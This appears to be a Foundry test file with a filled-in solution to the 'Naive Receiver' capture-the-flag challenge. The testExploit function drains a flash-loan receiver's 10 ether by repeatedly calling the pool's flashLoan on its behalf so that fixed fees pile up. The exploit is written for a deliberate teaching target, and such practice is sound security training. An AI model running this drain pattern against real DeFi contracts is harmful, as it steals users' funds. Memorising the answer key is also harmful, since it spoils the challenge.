// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/naive-receiver/FlashLoanReceiver.sol";
import "../../src/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverTest is Test {
    uint256 internal constant ETHER_IN_POOL = 1000 ether;
    uint256 internal constant ETHER_IN_RECEIVER = 10 ether;

    NaiveReceiverLenderPool internal pool;
    FlashLoanReceiver internal receiver;

    address internal deployer = address(1);
    address internal attacker = address(2);
    address internal user = address(3);

    function setUp() public {
        startHoax(deployer);
        pool = new NaiveReceiverLenderPool();
        payable(address(pool)).transfer(ETHER_IN_POOL);
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.fixedFee(), 1 ether);
        vm.stopPrank();

        startHoax(user);
        receiver = new FlashLoanReceiver(payable(address(pool)));
        payable(address(receiver)).transfer(ETHER_IN_RECEIVER);
        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker);
        while (true) {
            pool.flashLoan(payable(address(receiver)), ETHER_IN_POOL);
            if (address(receiver).balance == 0) {
                break;
            }
        }
        vm.stopPrank();

        /** SUCCESS CONDITIONS */
        // All ETH has been drained from the receiver
        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
